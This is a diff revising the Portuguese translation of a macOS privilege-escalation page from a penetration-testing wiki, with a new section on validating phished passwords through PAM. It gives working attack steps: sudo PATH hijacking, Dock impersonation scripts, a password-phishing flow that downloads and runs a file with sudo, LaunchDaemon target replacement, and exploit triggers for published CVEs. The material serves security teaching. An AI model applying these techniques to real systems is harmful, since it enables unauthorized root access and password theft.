@@ -4,14 +4,14 @@
 
 ## Escalonamento de privilégios do TCC
 
-Se você chegou aqui procurando informações sobre escalonamento de privilégios do TCC, acesse:
+Se você chegou aqui procurando por escalonamento de privilégios do TCC, acesse:
 
 
 {{#ref}}
 macos-security-protections/macos-tcc/
 {{#endref}}
 
-## Escalonamento de privilégios no Linux
+## Linux Privesc
 
 Muitas técnicas de escalonamento de privilégios que afetam o Linux ou outros sistemas semelhantes ao Unix também se aplicam ao macOS. Veja:
 
@@ -22,11 +22,11 @@ Muitas técnicas de escalonamento de privilégios que afetam o Linux ou outros s
 
 ## Interação com o usuário
 
-### Sudo Hijacking
+### Sequestro de Sudo
 
-Você pode encontrar a técnica original de [Sudo Hijacking na publicação sobre escalonamento de privilégios no Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
+Você encontra a técnica original de [sequestro de Sudo na publicação sobre escalonamento de privilégios no Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).
 
-No entanto, o macOS **mantém** o **`PATH`** do usuário quando ele executa **`sudo`**. Isso significa que outra forma de realizar esse ataque seria **sequestrar outros binários** que a vítima ainda executa ao **usar sudo:**
+No entanto, o macOS **mantém** o **`PATH`** do usuário quando ele executa **`sudo`**. Isso significa que outra maneira de realizar esse ataque seria **sequestrar outros binários** que a vítima ainda executaria ao **usar sudo:**
 
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
@@ -43,20 +43,20 @@ chmod +x /opt/homebrew/bin/ls
 sudo ls
 ```
 
-Observe que um usuário que utiliza o terminal provavelmente terá o **Homebrew instalado**. Portanto, é possível sequestrar binários em **`/opt/homebrew/bin`**.
+Note que um usuário que usa o terminal provavelmente terá o **Homebrew instalado**. Portanto, é possível fazer **hijack** de binaries em **`/opt/homebrew/bin`**.
 
-### Dock Impersonation
+### Imitação do Dock
 
-Com um pouco de **social engineering**, você poderia **se passar, por exemplo, pelo Google Chrome** no Dock e, na verdade, executar seu próprio script:
+Usando um pouco de **social engineering**, você poderia **se passar, por exemplo, pelo Google Chrome** no Dock e, na prática, executar seu próprio script:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 Algumas sugestões:
 
-- Verifique se há um Chrome no Dock e, se houver, **remova** essa entrada e **adicione** a entrada **falsa** do **Chrome na mesma posição** no array do Dock.
+- Verifique se há um Chrome no Dock e, nesse caso, **remova** essa entrada e **adicione** a entrada **falsa** do **Chrome na mesma posição** no array do Dock.
 
 <details>
-<summary>Script de impersonation do Chrome no Dock</summary>
+<summary>Script de imitação do Chrome no Dock</summary>
 
 ```bash
 #!/bin/sh
@@ -135,14 +135,14 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 Algumas sugestões:
 
-- Você **não pode remover o Finder do Dock**, então, se for adicioná-lo ao Dock, pode colocar o Finder falso ao lado do verdadeiro. Para isso, é preciso **adicionar a entrada do Finder falso no início do array do Dock**.
+- Você **não pode remover o Finder do Dock**, então, se for adicioná-lo ao Dock, pode colocar o Finder falso ao lado do verdadeiro. Para isso, você precisa **adicionar a entrada do Finder falso no início do array do Dock**.
 - Outra opção é não colocá-lo no Dock e simplesmente abri-lo. “Finder pedindo para controlar o Finder” não é tão estranho.
-- Outra opção para **escalar privilégios para root sem pedir** a senha com uma caixa de diálogo horrível é fazer o Finder realmente pedir a senha para executar uma ação privilegiada:
-  - Peça ao Finder para copiar um novo arquivo **`sudo`** para **`/etc/pam.d`** (o prompt de senha indicará que “o Finder quer copiar sudo”).
-  - Peça ao Finder para copiar um novo **Authorization Plugin** (você pode controlar o nome do arquivo para que o prompt de senha indique que “o Finder quer copiar Finder.bundle”).
+- Outra opção para **escalar para root sem pedir** a senha usando uma caixa de diálogo horrível é fazer o Finder realmente pedir a senha para realizar uma ação privilegiada:
+  - Pedir ao Finder para copiar um novo arquivo **`sudo`** para **`/etc/pam.d`** (o aviso pedindo a senha indicará que “o Finder quer copiar sudo”)
+  - Pedir ao Finder para copiar um novo **Authorization Plugin** (você pode controlar o nome do arquivo para que o aviso pedindo a senha indique que “o Finder quer copiar Finder.bundle”)
 
 <details>
-<summary>Script de impersonação do Finder no Dock</summary>
+<summary>Script de impersonação do Dock do Finder</summary>
 
 ```bash
 #!/bin/sh
@@ -219,9 +219,9 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-### Phishing por prompt de senha + reutilização de sudo
+### Phishing de prompt de senha + reutilização de sudo
 
-Malware frequentemente abusa da interação do usuário para **capturar uma senha com privilégios de sudo** e reutilizá-la programaticamente. Um fluxo comum:
+Malware frequentemente abusa da interação do usuário para **capturar uma senha que permita usar sudo** e reutilizá-la programaticamente. Um fluxo comum:
 
 1. Identificar o usuário conectado com `whoami`.
 2. **Repetir os prompts de senha** até que `dscl . -authonly "$user" "$pw"` retorne sucesso.
@@ -240,13 +240,19 @@ curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
 
-A senha roubada pode então ser reutilizada para **limpar a quarentena do Gatekeeper com `xattr -c`**, copiar LaunchDaemons ou outros arquivos privilegiados e executar etapas adicionais sem interação.<sup>[[1]](#references)</sup>
+A senha roubada pode então ser reutilizada para **limpar a quarentena do Gatekeeper com `xattr -c`**, copiar LaunchDaemons ou outros arquivos privilegiados e executar etapas adicionais de forma não interativa.<sup>[[1]](#references)</sup>
 
-## Vetores específicos de versões mais recentes do macOS (2023–2026)
+#### Validando senhas capturadas por meio do PAM
 
-### `AuthorizationExecuteWithPrivileges` descontinuado ainda pode ser usado
+Um prompt de texto seguro com aparência nativa pode coletar a senha candidata de uma conta e validá-la no próprio processo por meio do PAM, em vez de iniciar `dscl`, `security` ou `osascript`. O chamador inicia uma transação PAM com `pam_start`, fornece a senha candidata por meio de um callback de conversação, chama `pam_authenticate` e encerra a transação com `pam_end`. Uma verificação malsucedida pode retornar ao campo de senha; uma verificação bem-sucedida confirma a senha sem iniciar um processo de verificação separado. A autenticação PAM, por si só, **não** eleva os privilégios do chamador nem autoriza operações privilegiadas.<sup>[[9]](#references)[[10]](#references)</sup>
 
-`AuthorizationExecuteWithPrivileges` foi descontinuado na versão 10.7, mas **ainda funciona no Sonoma/Sequoia**. Muitos atualizadores comerciais invocam `/usr/libexec/security_authtrampoline` com um caminho não confiável. Se o binário de destino permitir escrita pelo usuário, você pode plantar um trojan e aproveitar o prompt legítimo:
+Se as senhas de login e do Keychain forem iguais, a senha capturada também poderá ser usada em operações que exigem a senha atual do Keychain; consulte [Keychain ACL e restrições da partition-list](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>
+
+## Vetores específicos das versões mais recentes do macOS (2023–2026)
+
+### `AuthorizationExecuteWithPrivileges`, embora obsoleto, ainda pode ser usado
+
+`AuthorizationExecuteWithPrivileges` foi descontinuado na versão 10.7, mas **ainda funciona no Sonoma/Sequoia**. Muitos atualizadores comerciais invocam `/usr/libexec/security_authtrampoline` com um caminho não confiável. Se o binário-alvo puder ser gravado pelo usuário, você pode implantar um trojan e aproveitar o prompt legítimo:
 
 ```bash
 # find vulnerable helper calls
@@ -258,12 +264,12 @@ chmod +x /Users/me/Library/Application\ Support/Target/helper
 # when the app updates, the root prompt spawns your payload
 ```
 
-Combine com os **truques de masquerading acima** para exibir um diálogo de senha convincente.
+Combine com os **truques de masquerading acima** para apresentar uma caixa de diálogo de senha convincente.
 
 
 ### Triagem de helper privilegiado / XPC
 
-Muitas escaladas de privilégio modernas em macOS de terceiros seguem o mesmo padrão: um **LaunchDaemon root** expõe um **serviço Mach/XPC** de **`/Library/PrivilegedHelperTools`**, e então o helper **não valida o cliente**, valida-o **tarde demais** (condição de corrida de PID) ou expõe um **método root** que consome um **caminho/script controlado pelo usuário**. Essa é a classe de vulnerabilidade por trás de muitos bugs recentes em helpers de clientes VPN, launchers de jogos e atualizadores.<sup>[[2]](#references)</sup>
+Muitos privescs modernos de terceiros no macOS seguem o mesmo padrão: um **LaunchDaemon root** expõe um **serviço Mach/XPC** de **`/Library/PrivilegedHelperTools`**; em seguida, o helper não valida o cliente, valida-o **tarde demais** (race de PID) ou expõe um **método root** que usa um **caminho/script controlado pelo usuário**. Essa é a classe de bugs por trás de muitas vulnerabilidades recentes em helpers de clientes VPN, launchers de jogos e atualizadores.<sup>[[2]](#references)</sup>
 
 Checklist rápido de triagem:
 
@@ -277,19 +283,19 @@ for f in /Library/PrivilegedHelperTools/*; do
 done
 ```
 
-Preste atenção especial a helpers que:
+Preste atenção especial aos helpers que:
 
 - continuam aceitando solicitações **após a desinstalação** porque o job permaneceu carregado no `launchd`
-- executam scripts ou leem configurações de **`/Applications/...`** ou de outros caminhos graváveis por usuários sem privilégios de root
-- dependem de validação do peer baseada em **PID** ou apenas em **bundle-id**, que pode estar sujeita a race condition
+- executam scripts ou leem configurações de **`/Applications/...`** ou de outros caminhos graváveis por usuários não root
+- dependem de validação do peer baseada em **PID** ou apenas em **bundle-id**, que pode ser vulnerável a race conditions
 
 Para mais detalhes sobre bugs de autorização em helpers, consulte [esta página](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).
 
 ### Herança do ambiente de scripts do PackageKit (CVE-2024-27822)
 
-Até a Apple corrigir o problema no **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, instalações iniciadas pelo usuário via **`Installer.app`** / **`PackageKit.framework`** podiam executar scripts PKG como root dentro do ambiente do usuário atual. Isso significa que um pacote usando **`#!/bin/zsh`** carregaria o **`~/.zshenv`** do atacante e o executaria como root quando a vítima instalasse o pacote.<sup>[[3]](#references)</sup>
+Até a Apple corrigir o problema no **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, instalações iniciadas pelo usuário via **`Installer.app`** / **`PackageKit.framework`** podiam executar scripts de PKG como root dentro do ambiente do usuário atual. Isso significa que um pacote usando **`#!/bin/zsh`** carregaria o **`~/.zshenv`** do atacante e o executaria como **root** quando a vítima instalasse o pacote.<sup>[[3]](#references)</sup>
 
-Isso é especialmente interessante como **logic bomb**: basta obter um foothold na conta do usuário e acesso de escrita a um arquivo de inicialização do shell; depois, é só esperar que o usuário execute qualquer instalador vulnerável baseado em **zsh**. Isso geralmente **não** se aplica a implantações via **MDM/Munki**, pois elas são executadas no ambiente do usuário root.<sup>[[3]](#references)</sup>
+Isso é especialmente interessante como **logic bomb**: basta obter um foothold na conta do usuário e ter um arquivo de inicialização do shell gravável; depois, é só esperar que o usuário execute qualquer instalador vulnerável baseado em **zsh**. Isso geralmente **não** se aplica a implantações de **MDM/Munki**, pois elas são executadas no ambiente do usuário root.<sup>[[3]](#references)</sup>
 
 ```bash
 # inspect a vendor pkg for shell-based install scripts
@@ -305,16 +311,16 @@ Se quiser se aprofundar em abusos específicos de instaladores, confira também 
 
 ### Colisão de destino do instalador via `.localized`
 
-Alguns instaladores de terceiros registram um LaunchDaemon root cujo executável é referenciado por um caminho fixo dentro de `/Applications/Target.app`. Se um atacante puder criar esse bundle primeiro com um **identificador de bundle diferente**, o Installer poderá preservar o chamariz e instalar o app real em `/Applications/Target.localized/Target.app`. O daemon ainda aponta para o caminho original. Portanto, um executável controlado pelo atacante dentro do bundle chamariz poderá ser executado posteriormente como root.<sup>[[8]](#references)</sup>
+Alguns instaladores de terceiros registram um LaunchDaemon de root cujo executável é referenciado por um caminho fixo dentro de `/Applications/Target.app`. Se um atacante puder criar esse bundle primeiro com um **identificador de bundle diferente**, o Installer poderá preservar o chamariz e instalar o app real em `/Applications/Target.localized/Target.app`. O daemon continua apontando para o caminho original. Portanto, um executável controlado pelo atacante dentro do bundle chamariz poderá ser executado posteriormente como root.<sup>[[8]](#references)</sup>
 
-Os pré-requisitos importantes são:<sup>[[8]](#references)</sup>
+As pré-condições importantes são:<sup>[[8]](#references)</sup>
 
 1. O atacante pode criar ou controlar o caminho esperado do aplicativo.
 2. O pacote não remove o bundle conflitante.
 3. O job privilegiado usa um caminho fixo dentro desse bundle.
-4. O usuário ou um fluxo de trabalho do MDM instala o pacote e registra o job.
+4. O usuário ou um fluxo de trabalho de MDM instala o pacote e registra o job.
 
-Procure bundles realocados e, em seguida, revise os destinos dos LaunchDaemon usando o loop de enumeração na próxima seção:<sup>[[8]](#references)</sup>
+Procure bundles realocados e, em seguida, revise os destinos dos LaunchDaemons usando o loop de enumeração da próxima seção:<sup>[[8]](#references)</sup>
 
 ```bash
 find /Applications -type d -name '*.localized' -prune -print
@@ -323,13 +329,13 @@ for app in /Applications/*.app; do
 done
 ```
 
-Um instalador mais seguro resolve o local final do bundle e mantém executáveis privilegiados em um local pertencente ao root, como `/Library/PrivilegedHelperTools`. Ele também deve verificar a propriedade e a assinatura de código antes de registrar ou iniciar o job.<sup>[[8]](#references)</sup>
+Um instalador mais seguro resolve o local final do bundle e mantém os executáveis privilegiados em um local pertencente ao root, como `/Library/PrivilegedHelperTools`. Ele também deve verificar a propriedade e a assinatura de código antes de registrar ou iniciar o job.<sup>[[8]](#references)</sup>
 
-### Hijack de destino gravável do LaunchDaemon
+### Writable LaunchDaemon target hijack
 
-Um plist do LaunchDaemon pode pertencer ao root, enquanto `Program` ou a primeira entrada de `ProgramArguments` aponta para um diretório gravável pelo usuário. Verifique o **caminho inteiro**, não apenas as permissões do executável. Se o diretório pai for gravável, um atacante poderá renomear um executável pertencente ao root e criar um substituto no mesmo caminho. O substituto será executado como root na próxima vez que o job for iniciado. Uma reinicialização ou um reinício normal do serviço é suficiente. O atacante não precisa ter permissão para executar `launchctl bootstrap` no domínio do sistema.<sup>[[7]](#references)</sup>
+Um plist do LaunchDaemon pode pertencer ao root, enquanto `Program` ou a primeira entrada de `ProgramArguments` aponta para um diretório gravável pelo usuário. Verifique o **caminho inteiro**, não apenas as permissões do executável. Se o diretório pai for gravável, um atacante poderá renomear um executável pertencente ao root e criar um substituto no mesmo caminho. O substituto será executado como root na próxima vez que o job iniciar. Uma reinicialização ou um reinício normal do serviço é suficiente. O atacante não precisa de permissão para executar `launchctl bootstrap` no domínio do sistema.<sup>[[7]](#references)</sup>
 
-Enumere primeiro cada destino e seu diretório pai imediato:<sup>[[7]](#references)</sup>
+Enumere primeiro cada alvo e seu diretório pai imediato:<sup>[[7]](#references)</sup>
 
 ```bash
 for p in /Library/LaunchDaemons/*.plist; do
@@ -342,7 +348,7 @@ for p in /Library/LaunchDaemons/*.plist; do
 done
 ```
 
-Quando o arquivo ou seu diretório pai puder ser gravado, preserve o binário original e substitua o caminho por um payload executável. Em seguida, aguarde a reinicialização do daemon já carregado.<sup>[[7]](#references)</sup>
+Quando o arquivo ou seu diretório pai permitir gravação, preserve o binário original e substitua o caminho por um payload executável. Em seguida, aguarde o daemon já carregado reiniciar.<sup>[[7]](#references)</sup>
 
 ```bash
 target=/path/from/the/plist
@@ -351,9 +357,9 @@ cp /tmp/payload "$target"
 chmod 755 "$target"
 ```
 
-### Race no ponteiro de credenciais do XNU SMR (CVE-2025-24118)
+### Corrida de ponteiro de credencial do XNU SMR (CVE-2025-24118)
 
-O caminho vulnerável `kauth_cred_proc_update` atualizava `proc_ro.p_ucred` com a API não atômica `zalloc_ro_mut`, enquanto os leitores SMR carregavam o ponteiro sem um lock. O trigger público usa um binário setgid preparado especialmente. Uma thread alterna entre seus IDs de grupo real e efetivo enquanto outra thread entra repetidamente em uma syscall como `getgid()`.<sup>[[4]](#references)</sup>
+O caminho vulnerável `kauth_cred_proc_update` atualizava `proc_ro.p_ucred` usando a API não atômica `zalloc_ro_mut`, enquanto leitores SMR carregavam o ponteiro sem bloqueio. O gatilho público usa um binário setgid preparado especialmente. Uma thread alterna entre os IDs de grupo real e efetivo enquanto outra thread executa repetidamente uma syscall, como `getgid()`.<sup>[[4]](#references)</sup>
 
 ```c
 // Writer thread inside a setgid binary
@@ -365,25 +371,25 @@ while (1) {
 while (1) observed_gid = getgid();
 ```
 
-Trate isso como uma **race primitive**, não como um exploit root pronto para uso. O PoC publicado demonstra um ponteiro de credenciais parcialmente sobrescrito. Geralmente, isso termina em kernel panic. O pesquisador só reproduziu a corrupção em Intel e não demonstrou controle determinístico sobre o objeto de credenciais resultante. A Apple alterou a atualização para uma troca atômica de ponteiros no macOS 15.3.<sup>[[4]](#references)</sup>
+Trate isto como uma **race primitive**, não como um exploit root pronto. O PoC publicado demonstra um ponteiro de credenciais parcialmente atualizado. Geralmente, isso termina em um kernel panic. O pesquisador só reproduziu a corrupção em Intel e não demonstrou controle determinístico do objeto de credenciais resultante. A Apple alterou a atualização para uma troca atômica de ponteiro no macOS 15.3.<sup>[[4]](#references)</sup>
 
 ### Bypass de SIP via Migration Assistant ("Migraine", CVE-2023-32369)
 
-Mesmo que você já tenha root, o SIP ainda bloqueia gravações em locais do sistema. O bug **Migraine** explora o entitlement do Migration Assistant `com.apple.rootless.install.heritable` para iniciar um processo filho que herda o bypass de SIP e sobrescreve caminhos protegidos (por exemplo, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> A cadeia:
+Mesmo que você já tenha root, o SIP ainda bloqueia gravações em locais do sistema. O bug **Migraine** abusa do entitlement do Migration Assistant `com.apple.rootless.install.heritable` para iniciar um processo filho que herda o bypass de SIP e sobrescreve caminhos protegidos (por exemplo, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> A cadeia:
 
 1. Obtenha root em um sistema ativo.
-2. Acione o `systemmigrationd` com um estado elaborado para executar um binário controlado pelo invasor.
-3. Use o entitlement herdado para modificar arquivos protegidos pelo SIP, mantendo a persistência mesmo após a reinicialização.
+2. Acione `systemmigrationd` com um estado preparado para executar um binário controlado pelo atacante.
+3. Use o entitlement herdado para corrigir arquivos protegidos pelo SIP, mantendo as alterações mesmo após a reinicialização.
 
-### Contrabando de expressões NSPredicate/XPC (classe de bugs CVE-2023-23530/23531)
+### Smuggling de expressões NSPredicate/XPC (classe de bugs CVE-2023-23530/23531)
 
-Vários daemons da Apple aceitam objetos **NSPredicate** via XPC e validam apenas o campo `expressionType`, que pode ser controlado pelo invasor. Ao criar um predicate que avalia selectors arbitrários, é possível obter **execução de código em serviços XPC root/system** (por exemplo, `coreduetd`, `contextstored`). Quando combinado com uma fuga inicial do sandbox de um app, isso permite **escalada de privilégios sem avisos ao usuário**. Procure endpoints XPC que desserializam predicates e não tenham um visitor robusto.<sup>[[6]](#references)</sup>
+Vários daemons da Apple aceitam objetos **NSPredicate** via XPC e validam apenas o campo `expressionType`, que pode ser controlado pelo atacante. Ao criar um predicate que avalia seletores arbitrários, é possível obter **execução de código em serviços XPC root/system** (por exemplo, `coreduetd`, `contextstored`). Combinado com um escape inicial do sandbox de um app, isso permite **escalada de privilégios sem prompts ao usuário**. Procure endpoints XPC que desserializam predicates e não tenham um visitor robusto.<sup>[[6]](#references)</sup>
 
 ## TCC - Escalada de privilégios para root
 
-### CVE-2020-9771 - bypass de TCC via mount_apfs e escalada de privilégios
+### CVE-2020-9771 - Bypass de TCC e escalada de privilégios via mount_apfs
 
-**Qualquer usuário** (até mesmo usuários sem privilégios) pode criar e montar um snapshot do Time Machine com `-o noowners` e **acessar TODOS os arquivos** desse snapshot, ignorando as verificações de propriedade do volume ativo. O único privilégio necessário é que o aplicativo usado (como o `Terminal`) tenha **Acesso Total ao Disco** (`kTCCServiceSystemPolicyAllfiles`).
+**Qualquer usuário** (até mesmo usuários sem privilégios) pode criar e montar um snapshot do Time Machine com `-o noowners` e **acessar TODOS os arquivos** desse snapshot, ignorando as verificações de propriedade do volume ativo. O único privilégio necessário é que o aplicativo utilizado (como o `Terminal`) tenha **Acesso Total ao Disco** (`kTCCServiceSystemPolicyAllfiles`).
 
 Os comandos e a explicação completa estão na página de bypasses de TCC:
 
@@ -393,7 +399,7 @@ macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
 
 ## Informações confidenciais
 
-Isso pode ser útil para escalar privilégios:
+Isto pode ser útil para escalar privilégios:
 
 
 {{#ref}}
@@ -402,14 +408,17 @@ macos-files-folders-and-binaries/macos-sensitive-locations.md
 
 
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## References
 
-- [1] [Pentest Partners - 2025, o ano do Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [1] [Pentest Partners - 2025, o ano do infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 - [2] [CVE-2024-30165: escalada local de privilégios no AWS Client VPN para macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 - [3] [CVE-2024-27822: escalada de privilégios no macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
 - [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
 - [5] [Microsoft "Migraine": bypass de SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [6] [Trellix Advanced Research Center - uma nova classe de bugs de escalada de privilégios no macOS e iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
-- [7] [Sequestro de LaunchDaemon: escalada de privilégios e persistência por meio de permissões inseguras em pastas](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
+- [6] [Trellix Advanced Research Center - Uma nova classe de bugs de escalada de privilégios no macOS e iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
+- [7] [Sequestro de LaunchDaemon: escalada de privilégios e persistência por meio de permissões inseguras de pastas](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
 - [8] [LPE no macOS via diretório .localized](https://theevilbit.github.io/posts/localized/)
-{{#include ../../banners/hacktricks-training.md}}
+- [9] [Jamf Threat Labs - PamStealer: malware para macOS que se disfarça de app gerenciador de área de transferência](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
+- [10] [Kaspersky Securelist - MacSync analisado em detalhes](https://securelist.com/macsync-new-version/121383/)
